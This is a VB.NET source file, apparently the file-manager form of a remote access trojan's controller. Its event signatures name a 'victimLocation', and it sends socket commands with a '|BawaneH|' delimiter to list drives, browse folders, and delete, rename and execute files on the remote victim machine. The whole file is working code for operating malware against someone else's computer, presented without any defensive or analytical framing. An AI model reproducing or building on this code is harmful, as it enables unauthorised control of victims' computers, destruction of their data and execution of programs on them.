Imports System.Threading
Public Class Form2
    Public Event SendFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String)
    Public Event RetrieveFile(ByVal ip As String, ByVal victimLocation As String, ByVal filepath As String, ByVal filesize As String)

    Public sock As Integer

    Private Sub Form2_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        ListView1.Items.Clear()
    End Sub
    Private Sub Form2_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Form1.S.Send(sock, "GetDrives" & "|BawaneH|")
    End Sub


    Private Sub ListView1_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListView1.DoubleClick
        If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
            If TextBox1.Text.Length = 0 Then
                TextBox1.Text += ListView1.FocusedItem.Text
                ' Form1.S.Send(sock, "FileManager" & "|BawaneH|" & TextBox1.Text)
            Else
                TextBox1.Text += ListView1.FocusedItem.Text & "\"
                ' Form1.S.Send(sock, "FileManager" & "|BawaneH|" & TextBox1.Text)
            End If
            RefreshList()
        End If
    End Sub
    Public Sub RefreshList()
        Form1.S.Send(sock, "FileManager" & "|BawaneH|" & TextBox1.Text)
    End Sub


    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If TextBox1.Text.Length < 4 Then
            TextBox1.Text = ""
            Form1.S.Send(sock, "GetDrives" & "|BawaneH|")
        Else
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
            RefreshList()
        End If
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteToolStripMenuItem.Click
        Select Case ListView1.FocusedItem.ImageIndex
            Case 0 To 1
            Case 2
                Form1.S.Send(sock, "Delete|BawaneH|Folder|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text)
            Case Else
                Form1.S.Send(sock, "Delete|BawaneH|File|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text)
        End Select
        RefreshList()
    End Sub

    Private Sub DownloadToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub ExecuteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExecuteToolStripMenuItem.Click
        Form1.S.Send(sock, "Execute|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text)
    End Sub

    Private Sub RenameToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        Dim a As String
        a = InputBox("Enter New Name", "Rename")
        If a <> "" Then
            Select Case ListView1.FocusedItem.ImageIndex
                Case 0 To 1
                Case 2
                    Form1.S.Send(sock, "Rename|BawaneH|Folder|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text & "|BawaneH|" & a)
                Case Else
                    Form1.S.Send(sock, "Rename|BawaneH|File|BawaneH|" & TextBox1.Text & ListView1.FocusedItem.Text & "|BawaneH|" & a)
            End Select
        End If
        RefreshList()
        End Sub
End Class